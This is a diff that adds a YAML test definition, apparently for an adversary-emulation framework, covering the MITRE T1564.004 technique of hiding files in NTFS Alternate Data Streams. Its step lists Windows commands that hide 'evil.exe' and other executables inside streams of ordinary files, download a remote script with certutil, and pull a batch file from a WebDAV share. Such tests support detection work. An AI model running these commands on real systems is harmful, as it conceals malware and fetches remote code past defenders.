@@ -1,0 +1,30 @@
+api_version: "2.0"
+name: Alternate Data Streams (ADS)
+description: |
+    Execute from Alternate Streams
+
+    [Reference - 1](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)
+
+    [Reference - 2](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)
+args:
+    - name: path
+      type: path
+      default: c:\ADS\
+uuid: 8822c3b0-d9f9-4daf-a043-49f4602364f4
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1564: Hide Artifacts'
+    subtechniques:
+        - 'T1564.004: NTFS File Attributes'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: alternate-data-streams-(ads)
+      inline: "type C:\\temp\\evil.exe > \"C:\\Program Files (x86)\\TeamViewer\\TeamViewer12_Logfile.log:evil.exe\"\nextrac32 {{.Args.path}}\\procexp.cab {{.Args.path}}\\file.txt:procexp.exe\nfindstr /V /L W3AllLov3DonaldTrump {{.Args.path}}\\procexp.exe > {{.Args.path}}\\file.txt:procexp.exe\ncertutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\\temp:ttt\nmakecab {{.Args.path}}\\autoruns.exe {{.Args.path}}\\cabtest.txt:autoruns.cab\nprint /D:{{.Args.path}}\\file.txt:autoruns.exe {{.Args.path}}\\Autoruns.exe\nreg export HKLM\\SOFTWARE\\Microsoft\\Evilreg {{.Args.path}}\\file.txt:evilreg.reg\nregedit /E {{.Args.path}}\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey\nexpand \\\\webdav\\folder\\file.bat {{.Args.path}}\\file.txt:file.bat\nesentutl.exe /y {{.Args.path}}\\autoruns.exe /d {{.Args.path}}\\file.txt:autoruns.exe /o \n"
+      executor: command_prompt
+      cleanup:
+        inline: ""
+        executor: command_prompt
